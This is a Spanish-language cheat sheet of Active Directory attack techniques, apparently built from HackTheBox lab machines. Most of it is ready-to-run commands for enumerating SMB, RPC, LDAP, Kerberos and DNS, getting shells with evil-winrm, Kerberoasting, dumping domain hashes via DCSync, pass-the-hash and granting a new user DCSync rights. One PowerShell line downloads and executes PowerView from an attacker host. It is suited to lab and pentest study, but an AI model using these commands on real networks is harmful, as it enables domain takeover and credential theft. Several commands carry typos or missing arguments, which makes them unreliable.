# Técnicas de directorio activo

## Puertos importantes

- 53: DNS
- 88: Kerberos
- 445: SMB
- 135: Windows RPC
- 389: LDAP
- 5985: Administración remota de windows

## Enumeración

Tecnicas de enumeración de directorio activo

### sincronizar reloj.

Es conveniente sincronizar el reloj con el DC.

```bash
# Sincronizar reloj
ntpdate 10.10.10.175
```

### SMB

Si tiene el puerto 445 lo primero es enumerar con **crackmapexec**, **smbmap**, **smbclient**,....

```bash
# Se averigua nombre de maquina y dominio.
crackmapexec smb 10.10.10.175

# Listar recursos compartidos
crackmapexec smb 10.10.10.175 --shares

# smbmap con session nula
smbmap -H 10.10.10.175 -u 'null'

# smbclient con session nula
smbclient -L 10.10.10.175 -N

```

Poner el dominio en /etc/host.

Si se tiene una credencial válida podemos comprobar el usuario.

```bash
# Si pone pwned podríamos acceder con PSEXEC
crackmapexec smb 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'

```

### RPC

Si tiene el puerto 135 podemos enumerar con **rpcclient**.

```bash
# rpcclient con sesion nula
rpcclient -U "" 10.10.10.174 -N

# Enumerar usuarios del dominio:
rcpclient $> enumdomusers

```

### LDAP

Si tiene el puerto 389 podemos enumerar con **ldapsearch**.

```bash
# ldapseacrh -x es simple autentication. traemos los namingcontext
ldapsearch -x -h  10.10.10.174 -N -s base namingcontexts

# ldapseacrh -x es simple autentication. Enumeramos el contexto
ldapsearch -x -h  10.10.10.174 -N -b 'DC=EGOTISTICAL-BANK, DC=LOCAL'
```

### KERBEROS

Si se consiguen usuarios y está el servicio de Kerberos abierto, puerto 88, podemos enumerar con kerbrute y GetNPUsers.

```bash
# kerbrute. Enumera usuarios válidos a partir de un listado
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.174 users.txt

# Lo mismo con Impacket
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
```

### DNS

Si está abierto el puerto 53 podemos intentar un ataque de transferencia de dominio con dig.

```bash
# dig. Enumera los nameservers
dig @10.10.10.174 EGOTISTICAL-BANK.LOCAL ns

# dig. Enumera los servidores de correo
dig @10.10.10.174 EGOTISTICAL-BANK.LOCAL mx

# dig. Domain Zone Transfer Attack
dig @10.10.10.174 EGOTISTICAL-BANK.LOCAL axfr


```

## Administración remota, WINRM

Si está abierto el servicio de administración remota, puerto 5985, podemos atacar el servicio winrm con crackmapexec.

```bash
# Si pone pwned podríamos acceder con evil-winrm
crackmapexec winrm 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'

# Acceso a consola por 
evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
```
## Explotación

```bash
# Acceso a consola evil-winrm. Credenciales válidas y servicio de administración remota  
evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'

# Si el LDAP es por SSL
evil-winrm -i 10.10.10.175 -c public.pem -k provate.pem -s
```

```bash
# Acceso a consola rpcclient. Credenciales válidas y SMB. Despues  enumdomusers  
evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
# enumer usuarios del dominio
rpcclient $> enumdomusers
# enumer grupos 
rpcclient $> enumdomgroups
# enumer usuarios de un grupo
rpcclient $> querygroupmem 0x200
# enumer info de un usuario
rpcclient $> queryuser 0x1f4
# Descripciones de los usuarios
rpcclient $> querydispinfo
```
## Escalada de privilegios

### Kerberoasting attack

Con credenciales válidas.
 ```bash

 impacket-GetUserSPNs htb.local/alfresco -dc-ip 10.10.10.141
 
 ```


### WinPEAS

Subir WinPEAS.exe a la máquina victima y ejecutarlo. Podemos obtener credenciales de autologon.

### BloodHound

Instalar en la maquina atacante neo4j y bloodhound. Previmente instalar Java 11.

```bash
# Instalación  
sudo apt install neo4j bloodhound

# Setear versión de java por defecto a la 11
sudo update-alternatives --config java

# Lanzamos neo4j. Configuramos en http://localhost:7474
sudo neo4j console &> /dev/null & disown

# Abrimos bloodhound 
sudo bloodhound &> /dev/null & disown
```
Buscamos un recolector y lo subimos a la maquina victima.

En el caso de Poweshell SharpHound.ps

### Ldapdomaindump

Para dumpear el LDAP.

```bash
# Dumpea los HASHSES
ldapdomaindump -u 'htb.local/svc-alfresco' -p 's3vice' 10.10.10.161

```


### Ataque DCSync

```bash
# Dumpa los HASHSES
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:10.10.10.175

```

### Pass de HASH

Si hemos tenido suerte y tenemos el hash NTLM podemos hacer Pass the HASH con psexec.

```bash
# Pass the hash,
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator:10.10.10.175 cmd.exe -hashes :elhahsahnt

# Tambien con crackmapexec. Dumpeamos todos los hashes
crackmapexec -u 'Administrator' -H 'elhashntlm' --ntds vss
# Conexión como administrador
crackmapexec -u 'Administrator' -H 'elhashntlm' 

```

## Grupos interesantes:

* **Account Operators**: Puede crear y modificar usuarios
* **Exchange Windows Permissions** Se puede otorgar permisos para ejecutar DCSync con la funcion WriteDacl

## Comandos

```poweshell
# Crear usuario
net user jamunof Password123 /add /domain

# Ver info usuario
net user jamunoz

# Ver grupos
net group

#Añadir usuario a grupo
net group "Exchange Windows Permissions" jamunoz /add

#Dar privilegios para DCSync
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\jamunoz'.$SecPassword)
# Descargar PowerView.ps1, previemente descargado de internet en maquina atacante
IEX(New-Object Net.WebClient).downloadString('http://10.10.104.29/PowerView.ps1')
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jamunoz -Rights DCSync

```

